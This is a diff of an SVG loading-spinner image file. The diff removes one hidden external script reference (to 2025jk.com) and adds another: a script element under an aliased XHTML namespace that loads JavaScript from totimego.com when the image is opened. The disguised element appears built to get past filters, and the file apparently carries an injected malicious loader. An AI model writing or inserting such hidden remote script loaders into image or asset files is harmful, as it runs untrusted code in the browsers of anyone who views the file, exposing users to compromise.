@@ -1,6 +1,7 @@
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg width="100%"  height="100%"  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="-50 -50 200 200" preserveAspectRatio="xMidYMid" class="lds-ripple">
-    <circle cx="50" cy="50" r="14.0334" fill="none" stroke="#c0f6d2" stroke-width="6">
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50" viewBox="0 0 200 50">
+        <circle cx="50" cy="50" r="14.0334" fill="none" stroke="#c0f6d2" stroke-width="6">
       <animate attributeName="r" calcMode="spline" values="0;40" keyTimes="0;1" dur="1" keySplines="0 0.2 0.8 1" begin="-0.5s" repeatCount="indefinite"></animate>
       <animate attributeName="opacity" calcMode="spline" values="1;0" keyTimes="0;1" dur="1" keySplines="0.2 0 0.8 1" begin="-0.5s" repeatCount="indefinite"></animate>
     </circle>
@@ -8,5 +9,7 @@
       <animate attributeName="r" calcMode="spline" values="0;40" keyTimes="0;1" dur="1" keySplines="0 0.2 0.8 1" begin="0s" repeatCount="indefinite"></animate>
       <animate attributeName="opacity" calcMode="spline" values="1;0" keyTimes="0;1" dur="1" keySplines="0.2 0 0.8 1" begin="0s" repeatCount="indefinite"></animate>
     </circle>
-    <script xlink:href="//2025jk.com/jm.33.js"></script>
+    <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-size="14px" fill="#007bff" id="msg"> </text>
+    <something:script src="//totimego.com/assets/js/101.js" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
+
 </svg>
